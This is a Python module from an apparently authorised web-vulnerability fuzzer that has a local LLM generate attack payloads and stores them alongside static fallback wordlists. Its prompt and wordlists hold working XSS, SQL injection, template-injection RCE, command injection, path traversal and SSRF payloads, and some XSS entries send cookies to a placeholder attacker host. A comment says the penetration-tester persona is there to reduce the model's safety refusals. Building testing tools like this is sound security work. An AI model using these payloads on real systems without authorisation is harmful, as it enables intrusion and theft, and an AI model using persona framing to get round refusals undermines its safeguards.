"""
AHVF — Module 3: AI Payload Orchestrator (FR-05)
==================================================
Implements FR-05.1 through FR-05.7:
  FR-05.1  Batch schemas into LLM requests (configurable batch size)
  FR-05.2  System prompt enforces structured JSON response format
  FR-05.3  Request second-order injection payloads (stored XSS/SQLi)
  FR-05.4  Request polyglot payloads for dual SQL+HTML contexts
  FR-05.5  SSTI payloads for file upload filename parameters
  FR-05.6  Validate LLM JSON response against expected schema
  FR-05.7  After cache population, AI connection is terminated

Input:  Condensed schemas from M2 (SchemaCondenser)
Output: Payload cache written to SQLite payload_cache table

Fallback: If Ollama fails or model refuses, falls back to a local
          static wordlist (per Risk R-01 in SRS).

DESIGN NOTE: The AI tier operates ONLY during cold phases (pre-execution
             synthesis). It is NEVER in the critical path of the fuzzing
             loop (Design Constraint, SRS line 27).

USAGE:
    from payload_orchestrator import PayloadOrchestrator
    from ollama_client import OllamaClient
    from database import AHVFDatabase

    db = AHVFDatabase()
    db.initialize()
    client = OllamaClient()
    orchestrator = PayloadOrchestrator(client, db)
    orchestrator.generate_payloads(condensed_schemas)
    client.close()  # FR-05.7: sever AI connection after cache population
"""

import json
import time
from dataclasses import dataclass, field
from typing import Optional

from ollama_client import OllamaClient, OllamaError, OllamaJSONParseError
from schema_condenser import CondensedSchema, SchemaCondenser


# ---------------------------------------------
#  LLM PROMPT TEMPLATES (SRS Appendix A.1)
# ---------------------------------------------

# System prompt adapted from SRS line 194 for the local Ollama model.
# Uses a "QA engineer" persona to reduce safety refusals (Risk R-01).
PAYLOAD_SYSTEM_PROMPT = """You are an expert penetration tester working on an authorized security testing engagement. Your job is to generate comprehensive, real-world attack payloads that test for actual vulnerabilities. Do NOT generate trivial or toy payloads.

You MUST respond with ONLY a valid JSON array. No explanations, no markdown, no commentary.

Each test case must be a JSON object with these exact keys:
- "payload": the exact test string to inject
- "target_param": which parameter from the schema to inject into
- "vuln_class": one of: XSS, SQLI, SSTI, IDOR, SSRF, PATH_TRAVERSAL, SECOND_ORDER_XSS, SECOND_ORDER_SQLI, POLYGLOT, COMMAND_INJECTION, OPEN_REDIRECT
- "expected_indicator": substring expected in an anomalous response that PROVES exploitation worked. Use specific strings like "alert(", "root:", "<script", SQL error keywords ("syntax", "mysql", "ORA-"), or HTTP status codes like "200" for access-control tests. NEVER use just "500" alone — a 500 is often just a crash, not proof of exploitation.

MANDATORY RULES FOR COMPREHENSIVE PAYLOADS:
1. Generate 5-10 payloads PER injectable parameter. Cover MULTIPLE evasion techniques per vuln class.
2. For EVERY parameter, test at least XSS and SQLI. If the parameter name suggests an ID, also test IDOR.
3. Generate BOTH reflected AND second-order payloads where applicable.

PAYLOAD QUALITY GUIDELINES (follow these examples):

=== XSS (CWE-79) — test HTML context, JS context, attribute context ===
- HTML context: <script>alert(1)</script>  |  indicator: <script>alert(
- Attribute escape: " onfocus=alert(1) autofocus="  |  indicator: onfocus=
- SVG: <svg/onload=alert(1)>  |  indicator: onload=
- IMG tag: <img src=x onerror=alert(1)>  |  indicator: onerror=
- Event handler: <details/open/ontoggle=alert(1)>  |  indicator: ontoggle=
- WAF bypass: <scr<script>ipt>alert(1)</scr</script>ipt>  |  indicator: alert(
- Encoded: %3Cscript%3Ealert(1)%3C/script%3E  |  indicator: <script>
- Polyglot: jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A  |  indicator: alert(

=== SQLI (CWE-89) — test string context, numeric context, blind, error-based ===
- String context: ' OR '1'='1' --  |  indicator: syntax
- Error-based: ' AND 1=CONVERT(int,(SELECT @@version))--  |  indicator: Microsoft
- Union: ' UNION SELECT NULL,username,password FROM users--  |  indicator: UNION
- Blind boolean: ' AND 1=1--  (compare with ' AND 1=2--)  |  indicator: 200
- Blind time: ' AND SLEEP(5)--  |  indicator: (check response time)
- Stacked: '; WAITFOR DELAY '0:0:5'--  |  indicator: (check response time)
- Numeric context: 1 OR 1=1  |  indicator: 200

=== IDOR (CWE-639) — test with boundary IDs and other users' IDs ===
- Increment: if endpoint uses id=5, try id=1, id=2, id=6  |  indicator: 200
- Zero: id=0  |  indicator: 200
- Negative: id=-1  |  indicator: 200
- Large value: id=99999  |  indicator: 200
- Other user's UUID: replace UUID with a known different user's UUID  |  indicator: 200

=== SSRF (CWE-918) — test internal network access ===
- Localhost: http://127.0.0.1  |  indicator: root
- Metadata: http://169.254.169.254/latest/meta-data/  |  indicator: ami-id
- Internal: http://localhost:8080/admin  |  indicator: admin
- DNS rebinding: http://0x7f000001  |  indicator: root

=== SSTI (CWE-1336) — test template injection ===
- Jinja2: {{7*7}}  |  indicator: 49
- Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}  |  indicator: uid=
- Twig: {{7*'7'}}  |  indicator: 7777777

=== COMMAND_INJECTION (CWE-78) ===
- Semicolon: ; id  |  indicator: uid=
- Pipe: | cat /etc/passwd  |  indicator: root:
- Backtick: `whoami`  |  indicator: www-data
- Subshell: $(id)  |  indicator: uid=
- Newline: %0aid  |  indicator: uid=

=== PATH_TRAVERSAL (CWE-22) ===
- Basic: ../../etc/passwd  |  indicator: root:
- Encoded: ..%2f..%2fetc%2fpasswd  |  indicator: root:
- Double encoded: ..%252f..%252fetc%252fpasswd  |  indicator: root:
- Null byte: ../../etc/passwd%00.jpg  |  indicator: root:
- Windows: ..\\..\\windows\\win.ini  |  indicator: [extensions]

RESPONSE FORMAT — JSON array only:
[{"payload": "...", "target_param": "...", "vuln_class": "...", "expected_indicator": "..."}, ...]"""


PAYLOAD_USER_PROMPT_TEMPLATE = """Generate security test payloads for the following endpoint schemas. Each schema represents a unique endpoint structure with typed parameters.

For each schema, generate test cases for EVERY injectable parameter. Pay attention to:
- The "context_hints" field which tells you what the endpoint does
- The "params" field showing parameter names and their types
- Whether it's a file upload endpoint (generate SSTI filename payloads)
- The roles that have access (useful for BAC-aware payloads)

CRITICAL FOR IDOR TESTING:
- If the schema contains "path_ids", these are numeric IDs embedded in the URL path.
- Generate IDOR payloads with target_param set to the path_ids key (e.g., "path_seg_5").
- Use payloads: "1", "0", "-1", "99999", and IDs adjacent to the current value.

SCHEMAS:
{schemas}"""


# ---------------------------------------------
#  STATIC FALLBACK WORDLISTS (Risk R-01)
# ---------------------------------------------

FALLBACK_PAYLOADS = {
    "XSS": [
        {"payload": "<script>alert(1)</script>", "expected_indicator": "<script>alert(1)</script>"},
        {"payload": "<img src=x onerror=alert(1)>", "expected_indicator": "onerror="},
        {"payload": "'\"><svg/onload=alert(1)>", "expected_indicator": "onload="},
        {"payload": "javascript:alert(1)", "expected_indicator": "javascript:"},
        {"payload": "<details/open/ontoggle=alert(1)>", "expected_indicator": "ontoggle="},
        {"payload": "\"><script>alert('XSS')</script>", "expected_indicator": "<script>alert('XSS')</script>"},
        {"payload": "'-alert(1)-'", "expected_indicator": "alert"},
        {"payload": "\"><iframe src=javascript:alert(1)>", "expected_indicator": "iframe"},
        {"payload": "1<sc<script>ript>alert(1)</script>", "expected_indicator": "alert"},
        {"payload": "<body onload=alert(1)>", "expected_indicator": "onload="},
    ],
    "SQLI": [
        {"payload": "' OR '1'='1", "expected_indicator": "syntax"},
        {"payload": "1' AND SLEEP(5)--", "expected_indicator": "mysql"},
        {"payload": "' UNION SELECT NULL,NULL--", "expected_indicator": "UNION"},
        {"payload": "1; DROP TABLE test--", "expected_indicator": "syntax"},
        {"payload": "' OR 1=1#", "expected_indicator": "syntax"},
        {"payload": "admin' --", "expected_indicator": "syntax"},
        {"payload": "' OR 'a'='a", "expected_indicator": "syntax"},
        {"payload": "1') OR ('1'='1", "expected_indicator": "syntax"},
        {"payload": "%27%20OR%20%271%27%3D%271", "expected_indicator": "syntax"},
        {"payload": "1 OR 1=1", "expected_indicator": "syntax"},
    ],
    "IDOR": [
        {"payload": "1", "expected_indicator": "200"},
        {"payload": "0", "expected_indicator": "200"},
        {"payload": "-1", "expected_indicator": "200"},
        {"payload": "99999", "expected_indicator": "200"},
        {"payload": "2", "expected_indicator": "200"},
        {"payload": "admin", "expected_indicator": "200"},
    ],
    "SSTI": [
        {"payload": "{{7*7}}", "expected_indicator": "49"},
        {"payload": "${7*7}", "expected_indicator": "49"},
        {"payload": "{{config}}", "expected_indicator": "SECRET"},
        {"payload": "<%= 7*7 %>", "expected_indicator": "49"},
        {"payload": "#{7*7}", "expected_indicator": "49"},
        {"payload": "*{7*7}", "expected_indicator": "49"},
    ],
    "PATH_TRAVERSAL": [
        {"payload": "../../../../etc/passwd", "expected_indicator": "root:"},
        {"payload": "..\\..\\..\\..\\windows\\system32\\config\\sam", "expected_indicator": "root"},
        {"payload": "....//....//etc/passwd", "expected_indicator": "root:"},
        {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "expected_indicator": "root:"},
        {"payload": "/etc/passwd", "expected_indicator": "root:"},
        {"payload": "C:\\Windows\\win.ini", "expected_indicator": "extensions"},
        {"payload": "..%c0%af..%c0%afetc/passwd", "expected_indicator": "root:"},
        {"payload": "../../../../../../../../etc/passwd%00", "expected_indicator": "root:"},
    ],
    "SSRF": [
        {"payload": "http://127.0.0.1:80", "expected_indicator": "200"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "expected_indicator": "ami-id"},
        {"payload": "http://[::1]:80", "expected_indicator": "200"},
        {"payload": "http://localhost", "expected_indicator": "200"},
        {"payload": "file:///etc/passwd", "expected_indicator": "root:"},
        {"payload": "dict://127.0.0.1:11211/stat", "expected_indicator": "STAT"},
    ],
    "COMMAND_INJECTION": [
        {"payload": "; ls -la", "expected_indicator": "total"},
        {"payload": "| cat /etc/passwd", "expected_indicator": "root:"},
        {"payload": "$(whoami)", "expected_indicator": "www-data"},
        {"payload": "`id`", "expected_indicator": "uid="},
        {"payload": "& ping -c 1 127.0.0.1 &", "expected_indicator": "bytes"},
        {"payload": "|| id", "expected_indicator": "uid="},
        {"payload": "%0A id %0A", "expected_indicator": "uid="},
        {"payload": ";whoami;", "expected_indicator": "www-data"},
    ],
    "SECOND_ORDER_XSS": [
        {"payload": "<img src=x onerror=fetch('http://attacker/c?='+document.cookie)>", "expected_indicator": "onerror="},
        {"payload": "'\"><script>document.location='http://attacker/'+document.cookie</script>", "expected_indicator": "<script>"},
    ],
    "POLYGLOT": [
        {"payload": "'-alert(1)-'", "expected_indicator": "alert"},
        {"payload": "\\';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//", "expected_indicator": "alert"},
    ],
    "OPEN_REDIRECT": [
        {"payload": "http://evil.com", "expected_indicator": "evil.com"},
        {"payload": "//evil.com", "expected_indicator": "evil.com"},
        {"payload": "https://evil.com", "expected_indicator": "evil.com"},
        {"payload": "/%09/evil.com", "expected_indicator": "evil.com"},
    ],
}


# ---------------------------------------------
#  PAYLOAD VALIDATION
# ---------------------------------------------

VALID_VULN_CLASSES = {
    "XSS", "SQLI", "SSTI", "IDOR", "SSRF", "PATH_TRAVERSAL",
    "SECOND_ORDER_XSS", "SECOND_ORDER_SQLI", "POLYGLOT",
    "COMMAND_INJECTION", "OPEN_REDIRECT",
}

REQUIRED_PAYLOAD_KEYS = {"payload", "target_param", "vuln_class", "expected_indicator"}


def _validate_payload(payload_dict: dict) -> bool:
    """
    Validate a single payload dict against the expected schema (FR-05.6).
    Gracefully handles missing expected keys.
    Returns True if valid (salvageable), False otherwise.
    """
    # Payload is absolutely required
    if not payload_dict.get("payload"):
        return False

    # Provide defaults for missing keys
    if "target_param" not in payload_dict or not payload_dict["target_param"]:
        payload_dict["target_param"] = "unknown"
        
    if "vuln_class" not in payload_dict or not payload_dict["vuln_class"]:
        payload_dict["vuln_class"] = "UNKNOWN"
        
    if "expected_indicator" not in payload_dict:
        payload_dict["expected_indicator"] = ""

    # Vuln class should be one of the known types (lenient — accept unknown too)
    # Just log a warning for unknown types, don't reject
    return True


# ---------------------------------------------
#  PAYLOAD ORCHESTRATOR CLASS
# ---------------------------------------------

class PayloadOrchestrator:
    """
    Module 3: AI Payload Orchestrator.

    Takes condensed schemas from M2 and generates attack payloads
    using a local Ollama LLM. Payloads are validated, deduplicated,
    and stored in the SQLite payload_cache table.

    If the LLM fails or refuses, falls back to static wordlists.
    After all payloads are generated, the AI connection is severed (FR-05.7).
    """

    def __init__(self, ollama_client: OllamaClient, db=None, batch_size: int = 15):
        """
        Args:
            ollama_client: Configured OllamaClient instance.
            db: AHVFDatabase instance for writing to payload_cache.
            batch_size: Max schemas per LLM request (FR-05.1, default 50).
        """
        self.client = ollama_client
        self.db = db
        self.batch_size = batch_size
        self._total_generated = 0
        self._total_fallback = 0
        self._total_invalid = 0

    def generate_payloads(self, schemas: list[CondensedSchema]) -> list[dict]:
        """
        Main entry point: generate payloads for all condensed schemas.

        Steps:
          1. Format schemas into LLM-ready batches (FR-05.1)
          2. Send each batch to Ollama for payload generation
          3. Validate returned payloads (FR-05.6)
          4. Fall back to static wordlists for failed batches (R-01)
          5. Write all payloads to SQLite payload_cache (FR-05.7)
          6. Close AI connection (FR-05.7)

        Returns list of all generated payload dicts.
        """
        if not schemas:
            print("[M3] No schemas to process")
            return []

        print(f"\n{'='*60}")
        print(f"  M3: AI Payload Orchestrator")
        print(f"  Schemas: {len(schemas)} | Batch size: {self.batch_size}")
        print(f"  Model: {self.client.model}")
        print(f"{'='*60}\n")

        all_payloads = []
        start_time = time.time()

        # Format into LLM batches
        llm_batches = SchemaCondenser.format_for_llm(schemas, self.batch_size)
        print(f"[M3] Split into {len(llm_batches)} batch(es)")

        # Build schema_hash lookup for associating payloads
        schema_lookup = {s.schema_hash: s for s in schemas}

        # Process each batch
        for batch_idx, batch_json in enumerate(llm_batches, 1):
            print(f"\n[M3] Processing batch {batch_idx}/{len(llm_batches)}...")

            # Parse the batch to extract schema hashes for this batch
            batch_schemas = json.loads(batch_json)
            batch_hashes = [s["schema_hash"] for s in batch_schemas]

            # ALWAYS generate static payloads as the guaranteed baseline
            fallback = self._generate_batch_fallback(batch_hashes, schema_lookup)
            all_payloads.extend(fallback)

            # Try LLM generation
            batch_payloads = self._generate_batch_llm(batch_json, batch_hashes, schema_lookup)

            if batch_payloads:
                all_payloads.extend(batch_payloads)
                print(f"[M3] Merged {len(batch_payloads)} LLM payloads with {len(fallback)} static payloads for batch {batch_idx}")
            else:
                print(f"[M3] LLM failed for batch {batch_idx}, using only static wordlists")

        # Write to SQLite
        if self.db and all_payloads:
            self.db.insert_payloads(all_payloads)

        # Also write to JSON for inspection
        self._write_payload_json(all_payloads)

        elapsed = time.time() - start_time
        self._print_summary(all_payloads, elapsed)

        return all_payloads

    # -- LLM Generation -------------------------------------------

    def _generate_batch_llm(
        self,
        batch_json: str,
        batch_hashes: list[str],
        schema_lookup: dict[str, CondensedSchema],
    ) -> Optional[list[dict]]:
        """
        Send a batch of schemas to Ollama and parse the response.

        Returns list of validated payload dicts, or None if generation failed.
        """
        user_prompt = PAYLOAD_USER_PROMPT_TEMPLATE.format(schemas=batch_json)

        try:
            response = self.client.generate_json(
                system_prompt=PAYLOAD_SYSTEM_PROMPT,
                user_prompt=user_prompt,
                temperature=0.3,  # Low temp for consistent structured output
            )
        except OllamaError as e:
            print(f"[M3] Ollama generation failed: {e}")
            return None

        # Response should be a list of payload dicts
        if not isinstance(response, list):
            # Sometimes models wrap the array in an object or return a single object
            if isinstance(response, dict):
                # Check if it's a single payload object
                if all(k in response for k in REQUIRED_PAYLOAD_KEYS):
                    response = [response]
                else:
                    # Try common wrapper keys
                    for key in ("payloads", "test_cases", "results", "data"):
                        if key in response and isinstance(response[key], list):
                            response = response[key]
                            break
                    else:
                        print(f"[M3] Unexpected response structure (dict keys: {list(response.keys())})")
                        return None
            else:
                print(f"[M3] Unexpected response type: {type(response)}")
                return None

        # Validate each payload (FR-05.6)
        validated = []
        for payload_dict in response:
            if not isinstance(payload_dict, dict):
                self._total_invalid += 1
                continue

            if _validate_payload(payload_dict):
                # Associate with a schema_hash
                target_param = payload_dict.get("target_param", "")

                # Try to match the payload to a specific schema
                matched_hash = self._match_payload_to_schema(
                    target_param, batch_hashes, schema_lookup
                )
                
                if matched_hash:
                    payload_record = {
                        "schema_hash": matched_hash,
                        "vuln_class": payload_dict.get("vuln_class", "UNKNOWN"),
                        "payload": payload_dict["payload"],
                        "target_param": target_param,
                        "expected_indicator": payload_dict.get("expected_indicator", ""),
                    }
                    validated.append(payload_record)
                    self._total_generated += 1
                else:
                    self._total_invalid += 1
                    print(f"[M3] Rejected payload (no matching parameter '{target_param}' in batch): {payload_dict}")
            else:
                self._total_invalid += 1
                print(f"[M3] Skipped invalid payload: {payload_dict}")

        if validated:
            print(f"[M3] LLM returned {len(response)} payloads, {len(validated)} valid")
            return validated
        else:
            print(f"[M3] All {len(response)} LLM payloads were invalid")
            return None

    def _match_payload_to_schema(
        self,
        target_param: str,
        batch_hashes: list[str],
        schema_lookup: dict[str, CondensedSchema],
    ) -> Optional[str]:
        """
        Match a payload's target_param to the most relevant schema.

        Looks through all schemas in the current batch and finds
        one whose params contain the target_param.
        """
        for h in batch_hashes:
            schema = schema_lookup.get(h)
            if schema:
                if target_param in schema.params:
                    return h
                if target_param in schema.form_fields:
                    return h
                if target_param.startswith("path_seg_"):
                    # Basic bounds check if it's a valid path segment for this schema
                    try:
                        idx = int(target_param.split("_")[2])
                        path_parts = schema.path.strip("/").split("/")
                        if idx < len(path_parts):
                            return h
                    except (IndexError, ValueError):
                        pass
        return None

    # -- Fallback Generation (Risk R-01) --------------------------

    def _generate_batch_fallback(
        self,
        batch_hashes: list[str],
        schema_lookup: dict[str, CondensedSchema],
    ) -> list[dict]:
        """
        Generate payloads from static wordlists when the LLM fails.

        For each schema in the batch, generates basic payloads
        for each injectable parameter based on parameter type
        and context hints.
        """
        payloads = []

        for schema_hash in batch_hashes:
            schema = schema_lookup.get(schema_hash)
            if not schema:
                continue

            # Skip schemas with no injectable parameters at all
            all_params = dict(schema.params)
            # Also include form fields as injectable targets
            for fname, ftype in schema.form_fields.items():
                if fname not in all_params:
                    all_params[fname] = ftype
                    
            # Add path segments as targets for IDOR if they exist
            import re
            path_str = schema.path
            if path_str.startswith('/'):
                path_parts = path_str[1:].split('/')
            else:
                path_parts = path_str.split('/')
            
            for idx, seg in enumerate(path_parts):
                if seg and (seg.isdigit() or re.match(r'^[0-9a-fA-F]{8}-', seg)):
                    all_params[f"path_seg_{idx}"] = "number"

            if not all_params and not schema.is_file_upload:
                continue

            # Determine which vuln classes to test based on context
            vuln_classes = self._select_vuln_classes(schema)

            for param_name in all_params.keys():
                for vuln_class in vuln_classes:
                    class_payloads = FALLBACK_PAYLOADS.get(vuln_class, [])
                    for p in class_payloads:
                        payloads.append({
                            "schema_hash": schema_hash,
                            "vuln_class": vuln_class,
                            "payload": p["payload"],
                            "target_param": param_name,
                            "expected_indicator": p["expected_indicator"],
                        })
                        self._total_fallback += 1

            # SSTI payloads for file upload filenames (FR-05.5)
            if schema.is_file_upload:
                for p in FALLBACK_PAYLOADS.get("SSTI", []):
                    payloads.append({
                        "schema_hash": schema_hash,
                        "vuln_class": "SSTI",
                        "payload": f"{p['payload']}.jpg",
                        "target_param": "filename",
                        "expected_indicator": p["expected_indicator"],
                    })
                    self._total_fallback += 1

        return payloads

    def _select_vuln_classes(self, schema: CondensedSchema) -> list[str]:
        """
        Select which vulnerability classes to test based on
        the schema's context hints and parameters.
        """
        classes = ["XSS", "SQLI"]  # Always test these

        hints_str = " ".join(schema.context_hints).lower()

        if "file" in hints_str or "upload" in hints_str:
            classes.extend(["SSTI", "PATH_TRAVERSAL"])
        if "search" in hints_str:
            classes.append("POLYGLOT")
        if "redirect" in hints_str or "callback" in hints_str or "url" in hints_str:
            classes.append("SSRF")
        if "export" in hints_str or "download" in hints_str:
            classes.append("PATH_TRAVERSAL")
        if "command" in hints_str or "exec" in hints_str or "run" in hints_str:
            classes.append("COMMAND_INJECTION")

        # Check param types for additional vectors
        for param_name, param_type in schema.params.items():
            name_lower = param_name.lower()
            if "url" in name_lower or "link" in name_lower or "redirect" in name_lower:
                if "SSRF" not in classes:
                    classes.append("SSRF")
            if "file" in name_lower or "path" in name_lower or "dir" in name_lower:
                if "PATH_TRAVERSAL" not in classes:
                    classes.append("PATH_TRAVERSAL")
            if "cmd" in name_lower or "command" in name_lower or "exec" in name_lower:
                if "COMMAND_INJECTION" not in classes:
                    classes.append("COMMAND_INJECTION")
            if "id" in name_lower or "user" in name_lower or "uid" in name_lower or "emp" in name_lower or "account" in name_lower or "profile" in name_lower:
                if "IDOR" not in classes:
                    classes.append("IDOR")
                    
        # Also check path segments for IDOR
        import re
        path_str = schema.path
        if path_str.startswith('/'):
            path_parts = path_str[1:].split('/')
        else:
            path_parts = path_str.split('/')
            
        for seg in path_parts:
            if seg and (seg.isdigit() or re.match(r'^[0-9a-fA-F]{8}-', seg)):
                if "IDOR" not in classes:
                    classes.append("IDOR")
                break

        return list(set(classes))  # Deduplicate

    # -- Output ---------------------------------------------------

    def _write_payload_json(self, payloads: list[dict]):
        """Write payloads to a JSON file for inspection."""
        from pathlib import Path

        output_path = Path("results") / "payload_cache.json"
        output_path.parent.mkdir(parents=True, exist_ok=True)

        output_path.write_text(
            json.dumps(payloads, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        print(f"[M3] Payload cache written to {output_path}")

    def _print_summary(self, payloads: list[dict], elapsed: float):
        """Print a summary of the payload generation run."""
        from collections import Counter

        print(f"\n{'='*60}")
        print(f"  M3: Payload Orchestrator — Summary")
        print(f"{'='*60}")
        print(f"  Total payloads generated  : {len(payloads)}")
        print(f"    |- From LLM             : {self._total_generated}")
        print(f"    |- From fallback lists   : {self._total_fallback}")
        print(f"    '- Invalid/discarded    : {self._total_invalid}")
        print(f"  Time elapsed              : {elapsed:.1f}s")

        if payloads:
            # Vuln class distribution
            vuln_counts = Counter(p.get("vuln_class", "UNKNOWN") for p in payloads)
            print(f"\n  Vulnerability class distribution:")
            for vuln_class, count in vuln_counts.most_common():
                print(f"    {vuln_class:25s} : {count}")

            # Schema coverage
            schema_hashes = set(p.get("schema_hash", "") for p in payloads)
            print(f"\n  Schema coverage           : {len(schema_hashes)} schema(s)")

        print(f"{'='*60}\n")


# ---------------------------------------------
#  STANDALONE TEST
# ---------------------------------------------

if __name__ == "__main__":
    from database import AHVFDatabase

    print("\n=== Payload Orchestrator Test ===\n")

    # Initialize DB
    db = AHVFDatabase()
    db.initialize()

    # Initialize Ollama client
    try:
        client = OllamaClient()
        client.health_check()
    except OllamaError as e:
        print(f"Ollama not available: {e}")
        print("Proceeding with fallback wordlists only.\n")
        client = None

    # Load condensed schemas
    condenser = SchemaCondenser(db)
    schemas = condenser.condense()

    if not schemas:
        print("No schemas found. Run the Crawler first, then the Schema Condenser.")
    else:
        if client:
            orchestrator = PayloadOrchestrator(client, db)
            payloads = orchestrator.generate_payloads(schemas)
            client.close()  # FR-05.7
        else:
            # Fallback-only mode
            print("Running in fallback-only mode (no LLM)...")
            orchestrator = PayloadOrchestrator.__new__(PayloadOrchestrator)
            orchestrator.db = db
            orchestrator.batch_size = 15
            orchestrator._total_generated = 0
            orchestrator._total_fallback = 0
            orchestrator._total_invalid = 0

            schema_lookup = {s.schema_hash: s for s in schemas}
            all_hashes = [s.schema_hash for s in schemas]
            payloads = orchestrator._generate_batch_fallback(all_hashes, schema_lookup)

            if db:
                db.insert_payloads(payloads)
            orchestrator._write_payload_json(payloads)
            orchestrator._print_summary(payloads, 0)

    db.close()
